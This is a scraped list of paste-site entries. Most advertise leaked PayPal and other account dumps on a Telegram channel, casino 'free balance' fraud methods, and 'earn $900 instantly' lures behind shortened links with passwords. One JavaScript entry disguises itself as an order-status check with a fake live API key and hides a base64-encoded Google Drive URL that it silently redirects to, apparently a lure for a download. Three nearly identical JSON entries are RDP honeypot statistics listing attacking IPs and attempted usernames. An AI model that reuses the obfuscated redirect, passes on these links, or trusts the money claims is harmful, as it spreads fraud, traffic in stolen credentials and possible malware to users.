id,title,username,language,date,content
qDXxs1V2,PayPal with Balance,jm33,JavaScript,Sunday 4th of May 2025 07:21:17 PM CDT,85541 Accounts Posted On https://t.me/leakzbyeminem
Snib72T0,Stake Free Balance Method,zebmekey,JavaScript,Sunday 4th of May 2025 07:21:02 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 31514
qE1NbTWE,Untitled,hubertzoo90,JavaScript,Sunday 4th of May 2025 07:20:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40973/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ghyu41E3,2025-05-03_stats.json,rdp_snitch,JSON,Sunday 4th of May 2025 07:18:33 PM CDT,"{
  ""ip"": {
    ""209.97.169.106"": 3717,
    ""58.218.199.219"": 33,
    ""45.117.177.2"": 1971,
    ""211.185.207.14"": 39,
    ""193.176.22.13"": 12,
    ""161.35.201.228"": 249,
    ""111.89.163.100"": 33,
    ""43.134.40.227"": 45,
    ""165.154.224.90"": 69,
    ""80.94.95.198"": 30,
    ""185.196.75.63"": 6,
    ""91.238.181.92"": 12,
    ""71.82.170.60"": 42,
    ""45.227.254.152"": 6,
    ""198.235.24.52"": 9,
    ""157.245.104.150"": 6,
    ""62.60.188.24"": 36,
    ""198.235.24.72"": 9,
    ""193.176.23.4"": 6,
    ""199.45.155.64"": 3,
    ""178.128.161.150"": 3,
    ""91.108.248.64"": 84,
    ""205.210.31.86"": 9,
    ""152.53.244.181"": 3,
    ""88.214.50.18"": 6,
    ""102.88.21.215"": 3,
    ""185.39.19.53"": 6,
    ""147.185.132.249"": 9,
    ""91.238.181.95"": 6
  },
  ""asn"": {
    ""AS14061"": 3975,
    ""AS4134"": 33,
    ""AS131353"": 1971,
    ""AS4766"": 39,
    ""Unknown"": 24,
    ""AS2514"": 33,
    ""AS132203"": 45,
    ""AS142002"": 69,
    ""AS204428"": 30,
    ""AS50837"": 6,
    ""AS49434"": 18,
    ""AS20115"": 42,
    ""AS267784"": 6,
    ""AS396982"": 36,
    ""AS215930"": 36,
    ""AS398722"": 3,
    ""AS215311"": 84,
    ""AS197540"": 3,
    ""AS29465"": 3,
    ""AS213021"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 3975,
    ""Chinanet"": 33,
    ""NHANHOA"": 1971,
    ""Korea Telecom"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""NTT PC Communications, Inc."": 33,
    ""Shenzhen Tencent Computer Systems Company Limited"": 45,
    ""Scloud Pte Ltd"": 69,
    ""SS-Net"": 30,
    ""CLOUDSIGMA AG"": 6,
    ""Datacenter location PAR1 France"": 18,
    ""Charter Communications"": 42,
    ""Flyservers S.A."": 6,
    ""Google LLC"": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 36,
    ""Censys, Inc."": 3,
    ""Regxa Company for Information Technology Ltd"": 84,
    ""netcup GmbH"": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Prime LLC"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 3972,
    ""Chinanet JS"": 33,
    ""Branch of Nhan Hoa Software Company"": 1971,
    ""Kornet"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""InfoSphere"": 33,
    ""Tencent Cloud Computing"": 45,
    ""Scloud Pte Ltd"": 69,
    ""Unmanaged LTD"": 30,
    ""SIAFLEX Bilisim Anonim Sirketi"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Spectrum"": 42,
    ""Xwin Universal LTD"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 36,
    ""Censys, Inc."": 3,
    ""Digitalocean"": 3,
    ""Unknown"": 84,
    ""netcup GmbH"": 3,
    ""MTN Nigeria"": 3,
    ""Prime LLC"": 6
  },
  ""regionName"": {
    ""South West"": 3717,
    ""Jiangsu"": 33,
    ""Ho Chi Minh"": 1971,
    ""Sejong-si"": 39,
    ""New York"": 24,
    ""Hesse"": 249,
    ""Tokyo"": 33,
    ""North West"": 45,
    ""Kowloon"": 72,
    ""Budapest"": 30,
    ""Denizli"": 6,
    ""\u00cele-de-France"": 18,
    ""Wisconsin"": 42,
    ""Vilnius"": 6,
    ""California"": 36,
    ""Karnataka"": 6,
    ""Tehran"": 36,
    ""England"": 3,
    ""Mazovia"": 84,
    ""Baden-Wurttemberg"": 3,
    ""Lagos"": 3,
    ""Moscow"": 6
  },
  ""country"": {
    ""Singapore"": 3762,
    ""China"": 33,
    ""Vietnam"": 1971,
    ""South Korea"": 39,
    ""United States"": 102,
    ""Germany"": 252,
    ""Japan"": 33,
    ""Hong Kong"": 72,
    ""Hungary"": 30,
    ""Turkey"": 6,
    ""France"": 18,
    ""Lithuania"": 6,
    ""India"": 6,
    ""Iran"": 36,
    ""United Kingdom"": 3,
    ""Poland"": 84,
    ""Nigeria"": 3,
    ""Russia"": 6
  },
  ""account"": {
    ""hello"": 6225,
    ""142.93.8.59"": 144,
    ""Domain"": 6,
    ""Test"": 36,
    ""FAovaZqyH"": 3,
    ""rhgTGU"": 3,
    ""cDugsg"": 3,
    ""rEFmYmAxS"": 3,
    ""CGYurA"": 3,
    ""OrEeTx"": 3,
    ""Administr"": 12,
    ""(empty)"": 3,
    ""mRotsBYLM"": 3,
    ""PUFVQn"": 3,
    ""vWsydj"": 3,
    ""yqSOiOvqi"": 3,
    ""vINdJI"": 3,
    ""MqqMxS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6462
  },
  ""client_build"": {
    ""Unknown"": 6462
  },
  ""client_name"": {
    ""Unknown"": 6462
  },
  ""ip_type"": {
    ""hosting"": 5799,
    ""proxy"": 33,
    ""Unknown"": 372,
    ""hosting & proxy"": 255,
    ""mobile & hosting"": 3
  }
}"
jLzEqVQt,EARN $900 INSTANTLY 2025 95,UKnoDatBoi,JavaScript,Sunday 4th of May 2025 07:18:17 PM CDT," 
Pdf https://tinyurl.com/freshleaks

QrUV7o3FFH
"
mQEaGEAa,2025-05-03_stats.json,rdp_snitch,JSON,Sunday 4th of May 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""209.97.169.106"": 3716,
    ""58.218.199.219"": 33,
    ""45.117.177.2"": 1971,
    ""211.185.207.14"": 39,
    ""193.176.22.13"": 12,
    ""161.35.201.228"": 249,
    ""111.89.163.100"": 33,
    ""43.134.40.227"": 45,
    ""165.154.224.90"": 69,
    ""80.94.95.198"": 30,
    ""185.196.75.63"": 6,
    ""91.238.181.92"": 12,
    ""71.82.170.60"": 42,
    ""45.227.254.152"": 6,
    ""198.235.24.52"": 9,
    ""157.245.104.150"": 6,
    ""62.60.188.24"": 36,
    ""198.235.24.72"": 9,
    ""193.176.23.4"": 6,
    ""199.45.155.64"": 3,
    ""178.128.161.150"": 3,
    ""91.108.248.64"": 84,
    ""205.210.31.86"": 9,
    ""152.53.244.181"": 3,
    ""88.214.50.18"": 6,
    ""102.88.21.215"": 3,
    ""185.39.19.53"": 6,
    ""147.185.132.249"": 9,
    ""91.238.181.95"": 6
  },
  ""asn"": {
    ""AS14061"": 3974,
    ""AS4134"": 33,
    ""AS131353"": 1971,
    ""AS4766"": 39,
    ""Unknown"": 24,
    ""AS2514"": 33,
    ""AS132203"": 45,
    ""AS142002"": 69,
    ""AS204428"": 30,
    ""AS50837"": 6,
    ""AS49434"": 18,
    ""AS20115"": 42,
    ""AS267784"": 6,
    ""AS396982"": 36,
    ""AS215930"": 36,
    ""AS398722"": 3,
    ""AS215311"": 84,
    ""AS197540"": 3,
    ""AS29465"": 3,
    ""AS213021"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 3974,
    ""Chinanet"": 33,
    ""NHANHOA"": 1971,
    ""Korea Telecom"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""NTT PC Communications, Inc."": 33,
    ""Shenzhen Tencent Computer Systems Company Limited"": 45,
    ""Scloud Pte Ltd"": 69,
    ""SS-Net"": 30,
    ""CLOUDSIGMA AG"": 6,
    ""Datacenter location PAR1 France"": 18,
    ""Charter Communications"": 42,
    ""Flyservers S.A."": 6,
    ""Google LLC"": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 36,
    ""Censys, Inc."": 3,
    ""Regxa Company for Information Technology Ltd"": 84,
    ""netcup GmbH"": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Prime LLC"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 3971,
    ""Chinanet JS"": 33,
    ""Branch of Nhan Hoa Software Company"": 1971,
    ""Kornet"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""InfoSphere"": 33,
    ""Tencent Cloud Computing"": 45,
    ""Scloud Pte Ltd"": 69,
    ""Unmanaged LTD"": 30,
    ""SIAFLEX Bilisim Anonim Sirketi"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Spectrum"": 42,
    ""Xwin Universal LTD"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 36,
    ""Censys, Inc."": 3,
    ""Digitalocean"": 3,
    ""Unknown"": 84,
    ""netcup GmbH"": 3,
    ""MTN Nigeria"": 3,
    ""Prime LLC"": 6
  },
  ""regionName"": {
    ""South West"": 3716,
    ""Jiangsu"": 33,
    ""Ho Chi Minh"": 1971,
    ""Sejong-si"": 39,
    ""New York"": 24,
    ""Hesse"": 249,
    ""Tokyo"": 33,
    ""North West"": 45,
    ""Kowloon"": 72,
    ""Budapest"": 30,
    ""Denizli"": 6,
    ""\u00cele-de-France"": 18,
    ""Wisconsin"": 42,
    ""Vilnius"": 6,
    ""California"": 36,
    ""Karnataka"": 6,
    ""Tehran"": 36,
    ""England"": 3,
    ""Mazovia"": 84,
    ""Baden-Wurttemberg"": 3,
    ""Lagos"": 3,
    ""Moscow"": 6
  },
  ""country"": {
    ""Singapore"": 3761,
    ""China"": 33,
    ""Vietnam"": 1971,
    ""South Korea"": 39,
    ""United States"": 102,
    ""Germany"": 252,
    ""Japan"": 33,
    ""Hong Kong"": 72,
    ""Hungary"": 30,
    ""Turkey"": 6,
    ""France"": 18,
    ""Lithuania"": 6,
    ""India"": 6,
    ""Iran"": 36,
    ""United Kingdom"": 3,
    ""Poland"": 84,
    ""Nigeria"": 3,
    ""Russia"": 6
  },
  ""account"": {
    ""hello"": 6224,
    ""142.93.8.59"": 144,
    ""Domain"": 6,
    ""Test"": 36,
    ""FAovaZqyH"": 3,
    ""rhgTGU"": 3,
    ""cDugsg"": 3,
    ""rEFmYmAxS"": 3,
    ""CGYurA"": 3,
    ""OrEeTx"": 3,
    ""Administr"": 12,
    ""(empty)"": 3,
    ""mRotsBYLM"": 3,
    ""PUFVQn"": 3,
    ""vWsydj"": 3,
    ""yqSOiOvqi"": 3,
    ""vINdJI"": 3,
    ""MqqMxS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6461
  },
  ""client_build"": {
    ""Unknown"": 6461
  },
  ""client_name"": {
    ""Unknown"": 6461
  },
  ""ip_type"": {
    ""hosting"": 5798,
    ""proxy"": 33,
    ""Unknown"": 372,
    ""hosting & proxy"": 255,
    ""mobile & hosting"": 3
  }
}"
xvfphD6v,2025-05-03_stats.json,rdp_snitch,JSON,Sunday 4th of May 2025 07:15:11 PM CDT,"{
  ""ip"": {
    ""209.97.169.106"": 3715,
    ""58.218.199.219"": 33,
    ""45.117.177.2"": 1971,
    ""211.185.207.14"": 39,
    ""193.176.22.13"": 12,
    ""161.35.201.228"": 249,
    ""111.89.163.100"": 33,
    ""43.134.40.227"": 45,
    ""165.154.224.90"": 69,
    ""80.94.95.198"": 30,
    ""185.196.75.63"": 6,
    ""91.238.181.92"": 12,
    ""71.82.170.60"": 42,
    ""45.227.254.152"": 6,
    ""198.235.24.52"": 9,
    ""157.245.104.150"": 6,
    ""62.60.188.24"": 36,
    ""198.235.24.72"": 9,
    ""193.176.23.4"": 6,
    ""199.45.155.64"": 3,
    ""178.128.161.150"": 3,
    ""91.108.248.64"": 84,
    ""205.210.31.86"": 9,
    ""152.53.244.181"": 3,
    ""88.214.50.18"": 6,
    ""102.88.21.215"": 3,
    ""185.39.19.53"": 6,
    ""147.185.132.249"": 9,
    ""91.238.181.95"": 6
  },
  ""asn"": {
    ""AS14061"": 3973,
    ""AS4134"": 33,
    ""AS131353"": 1971,
    ""AS4766"": 39,
    ""Unknown"": 24,
    ""AS2514"": 33,
    ""AS132203"": 45,
    ""AS142002"": 69,
    ""AS204428"": 30,
    ""AS50837"": 6,
    ""AS49434"": 18,
    ""AS20115"": 42,
    ""AS267784"": 6,
    ""AS396982"": 36,
    ""AS215930"": 36,
    ""AS398722"": 3,
    ""AS215311"": 84,
    ""AS197540"": 3,
    ""AS29465"": 3,
    ""AS213021"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 3973,
    ""Chinanet"": 33,
    ""NHANHOA"": 1971,
    ""Korea Telecom"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""NTT PC Communications, Inc."": 33,
    ""Shenzhen Tencent Computer Systems Company Limited"": 45,
    ""Scloud Pte Ltd"": 69,
    ""SS-Net"": 30,
    ""CLOUDSIGMA AG"": 6,
    ""Datacenter location PAR1 France"": 18,
    ""Charter Communications"": 42,
    ""Flyservers S.A."": 6,
    ""Google LLC"": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 36,
    ""Censys, Inc."": 3,
    ""Regxa Company for Information Technology Ltd"": 84,
    ""netcup GmbH"": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Prime LLC"": 6
  },
  ""org"": {
    ""DigitalOcean, LLC"": 3970,
    ""Chinanet JS"": 33,
    ""Branch of Nhan Hoa Software Company"": 1971,
    ""Kornet"": 39,
    ""SIA \""Singularity Telecom\"""": 24,
    ""InfoSphere"": 33,
    ""Tencent Cloud Computing"": 45,
    ""Scloud Pte Ltd"": 69,
    ""Unmanaged LTD"": 30,
    ""SIAFLEX Bilisim Anonim Sirketi"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 18,
    ""Spectrum"": 42,
    ""Xwin Universal LTD"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 36,
    ""Censys, Inc."": 3,
    ""Digitalocean"": 3,
    ""Unknown"": 84,
    ""netcup GmbH"": 3,
    ""MTN Nigeria"": 3,
    ""Prime LLC"": 6
  },
  ""regionName"": {
    ""South West"": 3715,
    ""Jiangsu"": 33,
    ""Ho Chi Minh"": 1971,
    ""Sejong-si"": 39,
    ""New York"": 24,
    ""Hesse"": 249,
    ""Tokyo"": 33,
    ""North West"": 45,
    ""Kowloon"": 72,
    ""Budapest"": 30,
    ""Denizli"": 6,
    ""\u00cele-de-France"": 18,
    ""Wisconsin"": 42,
    ""Vilnius"": 6,
    ""California"": 36,
    ""Karnataka"": 6,
    ""Tehran"": 36,
    ""England"": 3,
    ""Mazovia"": 84,
    ""Baden-Wurttemberg"": 3,
    ""Lagos"": 3,
    ""Moscow"": 6
  },
  ""country"": {
    ""Singapore"": 3760,
    ""China"": 33,
    ""Vietnam"": 1971,
    ""South Korea"": 39,
    ""United States"": 102,
    ""Germany"": 252,
    ""Japan"": 33,
    ""Hong Kong"": 72,
    ""Hungary"": 30,
    ""Turkey"": 6,
    ""France"": 18,
    ""Lithuania"": 6,
    ""India"": 6,
    ""Iran"": 36,
    ""United Kingdom"": 3,
    ""Poland"": 84,
    ""Nigeria"": 3,
    ""Russia"": 6
  },
  ""account"": {
    ""hello"": 6223,
    ""142.93.8.59"": 144,
    ""Domain"": 6,
    ""Test"": 36,
    ""FAovaZqyH"": 3,
    ""rhgTGU"": 3,
    ""cDugsg"": 3,
    ""rEFmYmAxS"": 3,
    ""CGYurA"": 3,
    ""OrEeTx"": 3,
    ""Administr"": 12,
    ""(empty)"": 3,
    ""mRotsBYLM"": 3,
    ""PUFVQn"": 3,
    ""vWsydj"": 3,
    ""yqSOiOvqi"": 3,
    ""vINdJI"": 3,
    ""MqqMxS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6460
  },
  ""client_build"": {
    ""Unknown"": 6460
  },
  ""client_name"": {
    ""Unknown"": 6460
  },
  ""ip_type"": {
    ""hosting"": 5797,
    ""proxy"": 33,
    ""Unknown"": 372,
    ""hosting & proxy"": 255,
    ""mobile & hosting"": 3
  }
}"
R5gTzFEt,Make $1000 15-MINUTES (BEGINNER) L4,UKnoDatBoi,JavaScript,Sunday 4th of May 2025 07:09:04 PM CDT," 
Pdf https://tinyurl.com/freshleaks

uqHhV4jmfk
"
9C9kZzDM,Leaked Accounts - Fresh Hits,jm33,JavaScript,Sunday 4th of May 2025 07:05:54 PM CDT,74715 Accounts Posted On https://t.me/leakzbyeminem
ukRct2yd,Scam Casinos and Stores,zebmekey,JavaScript,Sunday 4th of May 2025 07:05:40 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 87082
